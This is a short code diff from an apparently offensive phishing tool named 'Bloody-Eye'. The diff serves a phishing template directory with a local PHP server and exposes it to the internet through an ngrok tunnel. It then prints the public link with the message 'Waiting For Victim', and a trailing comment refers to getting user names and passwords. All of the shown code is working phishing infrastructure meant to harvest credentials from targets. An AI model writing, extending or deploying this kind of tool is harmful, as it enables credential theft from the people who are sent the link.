@@ -558,9 +558,12 @@ exit();""")
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
 
     global token
-    a = ngrok.connect(4545,"http",auth_token=token)
-    print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
-    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
+    link = ngrok.connect(6060,"http",auth_token=token)
+    a_print_link = (Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.RED+" Port Has Forwarded on >>> "+link)
+    b_print_link = (a_print_link).replace("http","https")
+    print("\n"+b_print_link)
+    print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Waiting For Victim ! ! !")
+
 
     
 # Getting User And Password
